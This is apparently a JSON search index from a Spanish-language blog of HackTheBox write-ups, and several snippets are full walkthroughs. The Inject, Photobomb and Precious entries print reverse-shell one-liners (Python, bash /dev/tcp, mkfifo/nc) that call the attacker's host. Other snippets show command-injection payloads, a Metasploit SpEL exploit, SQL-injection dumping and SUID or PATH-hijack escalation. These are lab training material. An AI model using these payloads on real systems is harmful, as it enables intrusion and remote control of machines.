[
  
  {
    "title": "Flight WriteUp",
    "url": "/posts/fligth-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-23 17:00:00 +0100",
    





    "snippet": "Proximamente…"
  },
  
  {
    "title": "Investigation WriteUp",
    "url": "/posts/investigation-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-22 17:00:00 +0100",
    





    "snippet": "Proximamente…"
  },
  
  {
    "title": "BroScience WriteUp",
    "url": "/posts/broscience-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-21 17:00:00 +0100",
    





    "snippet": "Proximamente…"
  },
  
  {
    "title": "MetaTwo WriteUp",
    "url": "/posts/metatwo-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy, wordpress, sql injection, virtual hosting",
    "date": "2023-03-20 17:00:00 +0100",
    





    "snippet": "Hoy toca compremeter la máquina MetaTwo de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de  Word Press, usando dicha vulnerabilidad podemos dumpear la base de datos y obtener el Usuario y la contraseña del usuario de Word Press,EnumeraciónIdentificando el OSEnviando trazas ICMP  (Internet Control Message Protocol) y usando el TTL(Time to Live) podemos identificar el OS.❯ ping -c1 10.10.11.186PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data.64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=156 ms--- 10.10.11.186 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 156.106/156.106/156.106/0.000 msNMAPSi realizamos un escaneo de puertos, encontramos:❯ nmap 10.10.11.186Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 12:53 -04Nmap scan report for 10.10.11.186Host is up (0.21s latency).Not shown: 997 closed tcp ports (reset)PORT   STATE SERVICE21/tcp open  ftp22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 16.43 secondsAnalizando la WebSi intentamos acceder a la web, nos redirige, para solucionar esto hacemos:echo '10.10.11.186   metapress.htb' | tee -a /etc/hostsCone esto arreglamos el problema de virtual hosting.Websi ingresamos a la direcciñon que nos muestra vemos esto:EventsSi miramos el código fuente vemos que usa el plugin booking-press v1.0.10 si buscamos un exploit para esa versión, encontramos este y este otro.Creamos un evnto y en todos los campos de texto colocamos bookingpress_form.BookingPressAhora vemos el código fuente y buscamos por once y copiamos ese pin. Con el exploit que les compartí podemos dumpear la base de datos.❯ python3 exploit.py -u http://metapress.htb -n 30594111b0- BookingPress PoC-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1-- Count of users:  2|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.||manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|Ahora copiamos el hash y lo intentamos crakear con john.❯ john -w:/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])Cost 1 (iteration count) is 8192 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuspartylikearockstar (manager)1g 0:00:00:03 DONE (2023-03-24 14:36) 0.2617g/s 28950p/s 28950c/s 28950C/s poochini..music69Use the \"--show --format=phpass\" options to display all of the cracked passwords reliablySession completedPodemos autenticarnos con Word Press.Comprometiendo la máquinaAccedemos al panel de WordPress.WP LoginMás tarde continuo………"
  },
  
  {
    "title": "Encoding WriteUp",
    "url": "/posts/encoding-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-19 17:00:00 +0100",
    





    "snippet": "Proximamente…"
  },
  
  {
    "title": "Inject WriteUp",
    "url": "/posts/inject-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy, directory transversal, Ansible playbook, spring, SpEL injection, command injection",
    "date": "2023-03-11 17:00:00 +0100",
    





    "snippet": "Les explicaré cómo compremeter la máquina Inject de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo Directory Transversal, usando dicha vulnerabilidad veremos una version vulnerable de Spring que cuenta con una vulnerabilidad de tipo command injection. Para migrar de usuario nos aprovecharemos de una contraseña filtrada. Y para escalar nuestros privilegios usaremos un archivo Ansibe playbook.Identificando el OSEnviando trazas ICMP (Internet Control Message Protocol) y usando el TTL(Time to Live) podemos identificar el OS.❯ ping -c1 10.129.178.241PING 10.129.178.241 (10.129.178.241) 56(84) bytes of data.64 bytes from 10.129.178.241: icmp_seq=1 ttl=63 time=214 ms--- 10.129.178.241 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 214.029/214.029/214.029/0.000 msVemos lo siguiente:  TTL          El TTL es 63, esto indica que es una máquina Linux, ya que dichas mæquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad.      Analizando la WEBWeb ErrorSi entramos veremos un mensaje de que no se puede acceder, así que sabemos que el puerto HTTP está corriendo en otro puerto, realizamos un escaneo NMAP.Escaneo NMAPrealizaremos el escaneo para saber que purtos están abierto y además para ver por donde corre el HTTP.❯ nmap 10.129.178.241Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 12:33 -04Nmap scan report for 10.129.178.241Host is up (0.23s latency).Not shown: 998 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 2.47 secondsCorre por el puerto 8080, ahora podemos ver la web correctamente.Web ErrorDetectando posibles métodos de intruciónVemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archiv, y vemos un Sing Up existe, podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos induca que esta en construcción.Enumerando DirectoriosUsando WFUZZ veremos algunos directorios importantes❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.178.241:8080/FUZZ 2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://10.129.178.241:8080/FUZZTotal requests: 220547=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000153:   200        112 L    326 W      5371 Ch     \"blogs\"                                                                                                                000000051:   200        103 L    194 W      5654 Ch     \"register\"                                                                                                             000000352:   200        53 L     107 W      1857 Ch     \"upload\"                                                                                                               000001097:   500        0 L      27 W       712 Ch      \"environment\"                                                                                                          000002694:   500        0 L      3 W        106 Ch      \"error\"                                                                                                                000008675:   200        33 L     77 W       1086 Ch     \"release_notes\"                                                                                                        000022957:   400        0 L      32 W       431 Ch      \"http%3A%2F%2Fwww\"                                                                                                     000045226:   200        165 L    487 W      6657 Ch     \"http://10.129.178.241:8080/\"                                                                                          ^CTotal time: 267.0736Processed Requests: 48259Filtered Requests: 48251Requests/sec.: 180.6954La carpera /upload nos llama la atención, ingresamos a ella y podemos ver que nos dejan subir archivosUploadSi suvimos una reverse shell de PHP nos dice que solo adminte imagenes, subimos una imagen random y meremos resultados.Imagenentramos a ver la imagen y …..mmmm  img?= eso huele a Directory Transversal.Podemos probar ver el /etc/passwd ingresamos la cadenaDirectory Transversal../../../../../../../../../../../../../../../../etc/passwdPero no vemos nada, podemos probar con burp o curl, interceptamos la petición y la mandamos al repeater.BurpsuiteAnalizando mas a fondo la web  podemos intentar listar la carppeta donde se guardan las paginas web /var/www/❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/'htmlWebAppla careta WebApp nos llama la atención podemos listar su contenido❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp'.classpath.DS_Store.idea.project.settingsHELP.mdmvnwmvnw.cmdpom.xmlsrctargetUn archivo .xml, lo leemos.❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp/pom.xml'&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\txsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\t&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\t&lt;parent&gt;\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\t\t&lt;version&gt;2.6.5&lt;/version&gt;\t\t&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;\t&lt;/parent&gt;\t&lt;groupId&gt;com.example&lt;/groupId&gt;\t&lt;artifactId&gt;WebApp&lt;/artifactId&gt;\t&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\t&lt;name&gt;WebApp&lt;/name&gt;\t&lt;description&gt;Demo project for Spring Boot&lt;/description&gt;\t&lt;properties&gt;\t\t&lt;java.version&gt;11&lt;/java.version&gt;\t&lt;/properties&gt;\t&lt;dependencies&gt;\t\t&lt;dependency&gt;  \t\t\t&lt;groupId&gt;com.sun.activation&lt;/groupId&gt;  \t\t\t&lt;artifactId&gt;javax.activation&lt;/artifactId&gt;  \t\t\t&lt;version&gt;1.2.0&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;\t\t\t&lt;scope&gt;runtime&lt;/scope&gt;\t\t\t&lt;optional&gt;true&lt;/optional&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;\t\t\t&lt;version&gt;3.2.2&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;\t\t\t&lt;scope&gt;test&lt;/scope&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.webjars&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;bootstrap&lt;/artifactId&gt;\t\t\t&lt;version&gt;5.1.3&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.webjars&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t&lt;/dependencies&gt;\t&lt;build&gt;\t\t&lt;plugins&gt;\t\t\t&lt;plugin&gt;\t\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t\t&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\t\t\t\t&lt;version&gt;${parent.version}&lt;/version&gt;\t\t\t&lt;/plugin&gt;\t\t&lt;/plugin&gt;\t\t&lt;finalName&gt;spring-webapp&lt;/finalName&gt;\t&lt;/build&gt;&lt;/project&gt;Viendo algunas versiones nos encontranos con Spring Cloud Function Web, buscando CVE nos encontramos que es vulnerable a SpEL injection.ExplotaciónExplotación manualMuy pronto, les explicaré cómo resolver de forma manual. Se paciente.Explotación con MetaSploitNos abrimos metasploitmsfconsoleUsando de apoyo este foro nos guiaremos. Una vez dentro de metasploit  haremos lo siguiente.[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/http/spring_cloud_function_spel_injection[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set RHOST 10.129.178.241RHOST =&gt; 10.129.178.241[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set LHOST 10.10.14.170LHOST =&gt; 10.10.14.170[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; run[*] Started reverse TCP handler on 10.10.14.170:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[!] The service is running, but could not be validated.[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp[*] Command Stager progress - 100.00% done (823/823 bytes)[*] Sending stage (3045348 bytes) to 10.129.178.241[*] Meterpreter session 1 opened (10.10.14.170:4444 -&gt; 10.129.178.241:43644) at 2023-03-12 21:25:11 -0400(Meterpreter 1)(/) &gt; shellProcess 76003 created.Channel 1 created.whoami &amp;&amp; idfrankuid=1000(frank) gid=1000(frank) groups=1000(frank)Ahora para mayor comodidad nos pasaremos esa shell mediante reverse shell, comprobamos si esta python3 y efectivamente esta instalado.export RHOST=\"10.10.14.170\";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'En nuestra máquina nos ponemos en escucha por el puerto 443 y nos debe llegar.❯ nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.170] from (UNKNOWN) [10.129.178.241] 48474frank@inject:/$Aplicamos tratamiento a la TTY.Migración de usuarioEn la carpeta personal del usuario listamos carpetas escondidadfrank@inject:~$ ls -a.  ..  .bash_history  .bashrc  .cache  .local  .m2  .profilefrank@inject:~$ la carpeta .m2 nos llama la atención, listamos su contenidofrank@inject:~$ ls .m2settings.xmlfrank@inject:~$ cat .m2/*&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;settings xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"        xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;  &lt;servers&gt;    &lt;server&gt;      &lt;id&gt;Inject&lt;/id&gt;      &lt;username&gt;phil&lt;/username&gt;      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;      &lt;filePermissions&gt;660&lt;/filePermissions&gt;      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;      &lt;configuration&gt;&lt;/configuration&gt;    &lt;/server&gt;  &lt;/servers&gt;&lt;/settings&gt;frank@inject:~$ Vemos la contraseña del usuario phil, migramos…frank@inject:~$ su philPassword:DocPhillovestoInject123 phil@inject:/home/frank$ …en su carpeta personal procedemos a leer la primera flag.phil@inject:~$ cat user.txt be****************************36phil@inject:~$ Escalada de PrivilegiosNo encontramos ningun binario SUID o permiso sudo, pero si si vemos a los grupos que pertenecemos vemos un grupo extraño staff.phil@inject:~$ iduid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)phil@inject:~$ Si listamos si tenemos capacidad para dicho grupo nos encontramos con estó.phil@inject:~$ find / -group staff -print 2&gt;/dev/null/opt/automation/tasks/root/var/localLa ruta /opt/automation/tasks nos llama la atención.phil@inject:~$ ls /opt/automation/tasks/playbook_1.ymlphil@inject:~$Si miramos el archivo se modificó recientemente, por lo cual puede que exista una tarea cron.Si volvemos a volver a checkear el archivo se modifico 2 minutos después.phil@inject:/opt/automation/tasks$ ls -lahtotal 12Kdrwxrwxr-x 2 root staff 4.0K Mar 13 01:46 .drwxr-xr-x 3 root root  4.0K Oct 20 04:23 ..-rw-r--r-- 1 root root   150 Mar 13 01:46 playbook_1.ymlphil@inject:/opt/automation/tasks$Un archivo .YML buscamos en internet el nombre del arvhivo “playbook”. Buscando en internet nos encotramos con este blog que nos lleva a un archivo de github. Creamos un archivo shell.yml con el siguiente contenido.Esto copiara la bash en la carpeta actual y la convertirá en SUID y podemos spawnear una shell como root.---                                                                                                               - name: shell                                                                                                    hosts: localhost  become: yes  tasks:  - name: hack    shell: \"cp /bin/bash . &amp;&amp; chmod +sx bash\"Una vez pasado los 2 minutos spawneamos la shell como root con:/usr/bin/ansible-playbook shell.yml./bash -pHurra!!!! somos root, procedemos a leer la flag del usuario rootbash-5.0# cat root.txt4e****************************67bash-5.0# Máquina Pwneada, sigue así muchacho."
  },
  
  {
    "title": "Photobomb WriteUp",
    "url": "/posts/photobomb-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy, command injection, path hijacking, easy, virtual hosting",
    "date": "2023-02-03 17:00:00 +0100",
    





    "snippet": "Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path HijackingEscaneo NMAPAntes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 13:24 -04Initiating SYN Stealth Scan at 13:24Scanning 10.10.11.182 [65535 ports]Discovered open port 80/tcp on 10.10.11.182Discovered open port 22/tcp on 10.10.11.182Completed SYN Stealth Scan at 13:24, 17.92s elapsed (65535 total ports)Nmap scan report for 10.10.11.182Host is up, received user-set (0.16s latency).Scanned at 2023-02-04 13:24:12 -04 for 18sNot shown: 61907 closed tcp ports (reset), 3626 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 18.08 seconds           Raw packets sent: 87248 (3.839MB) | Rcvd: 67894 (2.716MB)Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:echo \"10.10.11.182       photobomb.htb\" | tee -a /etc/hostsEnumeraciónVemos una pagina de inicio con un redirect a /printer Web SiteSi intentamos acceder nos pedirá credenciales Log inPodemos probar credenciales típicas por defecto, pero no resultará útil.admin:adminadmin:passwordadmin:passguest:guestSi revisamos el código fuente nos encontramos con cosaas interesantes.Le aplicamos un curl.❯ curl -s -X GET http://photobomb.htb&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;Photobomb&lt;/title&gt;  &lt;link type=\"text/css\" rel=\"stylesheet\" href=\"styles.css\" media=\"all\" /&gt;  &lt;script src=\"photobomb.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=\"container\"&gt;    &lt;header&gt;      &lt;h1&gt;&lt;a href=\"/\"&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;    &lt;/header&gt;    &lt;article&gt;      &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt;      &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt;      &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt;      &lt;p&gt;To get started, please &lt;a href=\"/printer\" class=\"creds\"&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt;      &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt;    &lt;/article&gt;  &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Podemos ver un script de JavaScript, si vemos su contenido se nos filtra una cookie❯ curl -s -X GET http://photobomb.htb/photobomb.jsfunction init() {  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');  }}window.onload = init;Al copiar dicha cookie, podemos ver el panel /printer.Log inExplotaciónEn este apartado vemos unas imagenes las cuales podemos descargar y hacer pequeñas modificaciones como ser:  Cambiarle la extensión y modicar el tamaño.PrinterPodemos interceptar la petición con BurpSuite y ver mas a detalles como se estructura todoBurpSuitePodemos ver si es vulnerable a un Command injection, pero antes que nada inicia un servidor con pythonpython -m http.server 80Mandamos la petición al Repeater, para ello presionamos Ctrl + RSi nos fijamos en los parametros podemos agregar ; y añadir nuestro comando, se vería asíBurpSuitePodemos ver que no le gusta en algunos parametros, pero con haciendo prueba y error encontramos que el parametro filetype es vulnerable, lo podemos comprobar en la petición❯ python -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.182 - - [04/Feb/2023 14:45:12] \"GET / HTTP/1.1\" 200 -Podemos intentar enviarnos una reverse shell, usano esta página podemos hacer la reverse shell con varias opciones.Probaremos con bash pero no funciona, así que podemos probar con python3 y esta nos lanzará la shellexport RHOST=\"10.10.14.25\";export RPORT=444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'RCE  Nota: Si usas nc mkfifo y url encode te lanzará la shell igualrm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.25%20444%20%3E%2Ftmp%2FfGanamos acceso a la máquina, estamos listos para rootearla❯ nc -lvnp 444listening on [any] 444 ...connect to [10.10.14.25] from (UNKNOWN) [10.10.11.182] 49946wizard@photobomb:~/photobomb$ Toca realizar un tratamiento a la tty, te puedes guiar de mi blog.Una vez adentro podemos leer la primera flagwizard@photobomb:~/photobomb$ cat ../user.txt 06****************************78wizard@photobomb:~/photobomb$ Escalada de privilegiosSi vemos los privilegios SUDOERS vemos que podemos ejecutar un programa hecho en bashwizard@photobomb:~/photobomb$ sudo -lMatching Defaults entries for wizard on photobomb:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser wizard may run the following commands on photobomb:    (root) SETENV: NOPASSWD: /opt/cleanup.shwizard@photobomb:~/photobomb$ Vemos que lo podemos ejecutar sin proporcionar ninguna contraseña, es decir que al ejecuralo como sudo sera ejecutado de forma temporal como root sin proporcionar contraseñawizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh wizard@photobomb:~/photobomb$ Si vemos el contenido de dicho archivo nos encontramos con binarios que podemos usar para elevar nuestros privilegios.wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh #!/bin/bash. /opt/.bashrccd /home/wizard/photobomb# clean up log filesif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]then  /bin/cat log/photobomb.log &gt; log/photobomb.log.old  /usr/bin/truncate -s0 log/photobomb.logfi# protect the priceless originalsfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;wizard@photobomb:~/photobomb$ Vemos que el binario find esta con ruta relativa no absoluta y esto puede derivar a un Path Hijacking,Podemos aprovechar que podemos cambiar variables de entorno como el Path para que nos ejecute el comando find personalizado, y bajo el contexto de sudo nuestro binario find lo ejecutará root.wizard@photobomb:/tmp$ echo bash &gt; findwizard@photobomb:/tmp$ chmod 777 find wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.shwizard@photobomb:/tmp$ ls -l /bin/bashroot@photobomb:/home/wizard/photobomb# Ya rooteamos la máquina, lo que hicimos fue hacer un binario perzonalizado find que nos lanze una bash como root, en este caso, ya que el esta ejecutando el /opt/cleanup.sh con el binario find de forma relativa.Procedemos a leer la flagroot@photobomb:/home/wizard/photobomb# cat /root/root.txt 74****************************35root@photobomb:/home/wizard/photobomb# ¡¡¡Máquina Pwneada!!! Te deseo un Feliz Hackeo."
  },
  
  {
    "title": "Precious WriteUp",
    "url": "/posts/precious-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, virtual hosting, command injection, pdfkit, easy, virtual hosting",
    "date": "2023-01-16 17:00:00 +0100",
    





    "snippet": "Les explicaré cómo comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la escalada cargaremos un archivo para convertir la BASH en SUID.Identificando el OSPara ello debemos enviar una traza ICMP(Internet Control Message Protocol), estas siglas sinifican Protocolo de Mensajes de Control de Internet y con la información que nos reporte podemos identificar el SO mediante el TTL(Time To live)❯ ping -c1 10.10.11.189PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=146 ms--- 10.10.11.189 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 146.342/146.342/146.342/0.000 msVemos lo siguiente:  TTL          El TTL es 63, esto indica que es una máquina Linux, ya que dichas máquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad.      Primeros pasosSi le aplicamos un curl con modo silent y para ver por las cabeceras y filtrando por location vemos un dominio❯ curl s 10.10.11.189 -i | grep LocationLocation: http://precious.htb/Sabiendo que se aplica Virtual Hosting debemos agregar el dominio al /etc/hostsecho 10.10.11.189   precious.htb   | tee -a /etc/hostsEscaneo NMAPSiempre que queramos auditar una máquina debemos aplicar un escaneo NMAP, ya que nos permitirá saber que puertos estan abiertos para poder empezar la fase de explotación❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.189Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:45 -04Initiating SYN Stealth Scan at 12:45Scanning 10.10.11.189 [65535 ports]Discovered open port 80/tcp on 10.10.11.189Discovered open port 22/tcp on 10.10.11.189Completed SYN Stealth Scan at 12:46, 15.23s elapsed (65535 total ports)Nmap scan report for 10.10.11.189Host is up, received user-set (0.16s latency).Scanned at 2023-02-19 12:45:56 -04 for 15sNot shown: 65471 closed tcp ports (reset), 62 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 15.35 seconds           Raw packets sent: 74834 (3.293MB) | Rcvd: 73784 (2.951MB)  Vemos los puertos          22 este puerto corre por defecto el servicio SSH      80 este es el encargado del purto WEB, es decir el HTTP      EnumeraciónVemos que en la web podemos convertir una Web a PDF, suena interesante, así que nos creamos un archivo .html con la siguiete estructuraPágina Web❯ cat index.html&lt;h1&gt; Hola Mundo &lt;/h1&gt;Creamos un servivor HTTP con python por el puerto 80 y en dicha web ponemos nustro servidor.  Recuerda cambiar tu IP.WEBAl darle Submit nos genera el PDF, si miramos los metadatos vemos la versión de PDFKIT❯ exiftool PDF.pdfExifTool Version Number         : 12.16File Name                       : PDF.pdfDirectory                       : .File Size                       : 10 KiBFile Modification Date/Time     : 2023:02:19 13:10:53-04:00File Access Date/Time           : 2023:02:19 13:10:53-04:00File Inode Change Date/Time     : 2023:02:19 13:11:14-04:00File Permissions                : rw-r--r--File Type                       : PDFFile Type Extension             : pdfMIME Type                       : application/pdfPDF Version                     : 1.4Linearized                      : NoPage Count                      : 1Creator                         : Generated by pdfkit v0.8.6Al hacer una simple busqueda por google, nos encontramos con este articuloAl usar este payload, debemos cambiar el sleep por una reverse shell.http://example.com/?name=#{'%20`sleep 5`'}Nos quedaría de esta manera.http://example.com/?name=#{'%20`bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.19/444 0&gt;&amp;1\"`'}Una vez enviada la petición nos llega la reverse shell❯ nc -lvnp 444listening on [any] 444 ...connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 47004bash: cannot set terminal process group (676): Inappropriate ioctl for devicebash: no job control in this shellruby@precious:/var/www/pdfapp$ Aplicamos un tratamiento a la TTYMigrando de UsuarioSomos el usuario ruby, si miramos en el directorio home por archivos ocultos nos encontramos con estoruby@precious:~$ ls -latotal 32drwxr-xr-x 5 ruby ruby 4096 Feb 19 12:28 .drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -&gt; /dev/null-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrcdr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundledrwxr-xr-x 4 ruby ruby 4096 Feb 19 08:27 .cachedrwxr-xr-x 3 ruby ruby 4096 Feb 19 12:28 .local-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profileSi leemos lo que exixte dentro de esa carpeta vemos las credenciales del usuario henryruby@precious:~$ cat .bundle/config ---BUNDLE_HTTPS://RUBYGEMS__ORG/: \"henry:Q3c1AqGHtoI0aXAYFH\"Migramos de 